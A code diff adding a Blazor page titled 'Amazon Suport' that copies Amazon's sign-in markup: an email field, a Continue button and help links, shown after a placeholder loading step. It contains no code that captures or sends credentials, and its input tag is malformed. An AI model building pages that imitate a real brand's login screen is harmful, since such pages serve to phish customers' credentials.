@@ -1,5 +1,60 @@
 ﻿
+<PageTitle>Amazon Suport</PageTitle>
+
+ @if(test == null){
+      <div class="spinner"></div>
+
+ }else{
+
+<div class="a-box-inner a-padding-extra-large">
+                                 <h1 class="a-spacing-small">
+                                    Sign in
+                                 </h1>
+                                 <div class="a-row a-spacing-base">
+                                    <label for="ap_email" class="a-form-label">
+                                    Email (phone for mobile accounts)
+                                    </label>
+                                    <type="email" id="email" name="email" class="a-input-text a-span12 auth-autofocus auth-required-field" value="" required>
+                                 </div>
+                                 <div class="a-section">
+                                    <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
+                                    Continue
+                                    </span></span>
+                                    </span>
+                                 </div>
+                                 <div class="a-section">
+                                    <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
+                                       <a href="#"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
+                                       Need help?
+                                       </span></a>
+                                       <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+                                          <a id="auth-fpp-link-bottom" class="a-link-normal" href="#">
+                                          Forgot your password?
+                                          </a>
+                                       </div>
+                                       <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+                                          <a id="ap-other-signin-issues-link" class="a-link-normal" href="#">
+                                          Other issues with sign in
+                                          </a>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+
+ }
 
 @code {
+    private string test;
+    protected override async Task OnInitializedAsync()
+    {
+        await Task.Run(LoadEmployees);
+    }
 
+    private void LoadEmployees()
+    {
+        //System.Threading.Thread.Sleep(2000);
+        test = "";
+        // Retrieve data from the server and initialize
+        // Employees property which the View will bind
+    }
 }
